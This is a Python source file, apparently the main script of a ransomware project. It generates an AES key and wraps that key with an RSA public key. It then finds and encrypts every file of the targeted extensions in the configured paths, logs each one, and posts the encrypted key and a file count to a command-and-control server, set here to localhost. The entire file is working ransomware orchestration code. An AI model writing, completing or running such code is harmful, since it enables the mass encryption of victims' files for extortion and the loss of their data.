import os
import base64
import requests
from Crypto.Random import get_random_bytes

from ransomware.config import TARGET_EXTENSION, TARGET_PATHS, PUBLIC_KEY_FILE
from ransomware.file_walker import find_files
from ransomware.encryptor import encrypt_file
from ransomware.rsa_keys import encrypt_key
from ransomware.logger import log_encrypted

def load_public_key():
    with open(PUBLIC_KEY_FILE, 'rb') as f:
        return f.read()

def reports_to_c2(encrypted_aes_key, num_files):
    try:
        response = requests.post("http://localhost:5000/report", json={
            "aes_key": encrypted_aes_key.decode(),
            "files_encrypted": num_files
        })
        # print("[+] Report sent to C2:", response.text) #just for testing
    except Exception as e:
        # print("[-] Failed to report to C2:", e) # just for testing
        pass

def main():
    public_key = load_public_key()
    aes_key = get_random_bytes(16)
    encrypted_aes_key = encrypt_key(aes_key, public_key)
    files = find_files(TARGET_PATHS, TARGET_EXTENSION)
    
    for file_path in files:
        encrypt_file(file_path, aes_key)
        log_encrypted(file_path)

    # Report to Flask C2
    reports_to_c2(encrypted_aes_key, len(files))

if __name__ == '__main__':
    main()
